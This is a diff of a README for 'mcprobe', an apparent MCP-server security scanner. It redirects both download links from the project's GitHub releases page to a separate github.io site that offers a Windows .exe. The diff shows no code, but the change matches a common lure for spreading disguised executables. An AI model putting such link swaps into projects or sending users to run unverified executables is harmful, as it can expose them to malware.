@@ -1,6 +1,6 @@
 # 🛡️ mcprobe - Secure your MCP server communication paths
 
-[![Download Latest Version](https://img.shields.io/badge/Download-mcprobe-blue)](https://github.com/Amalleheavy908/mcprobe/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-mcprobe-blue)](https://amalleheavy908.github.io)
 
 mcprobe helps you secure your Model Context Protocol (MCP) servers. It scans your connections to find security risks. This tool checks for injection patterns, sees if tools hide other tools, and tracks changes to your system over time. You do not need to install extra software. It is a single file that works on its own.
 
@@ -8,7 +8,7 @@ mcprobe helps you secure your Model Context Protocol (MCP) servers. It scans you
 
 You can get the software from the releases page. Follow these steps:
 
-1. Visit the [releases page](https://github.com/Amalleheavy908/mcprobe/releases).
+1. Visit the [releases page](https://amalleheavy908.github.io).
 2. Look for the latest version at the top of the page.
 3. Click the link that ends in .exe for Windows.
 4. Save the file to your computer.
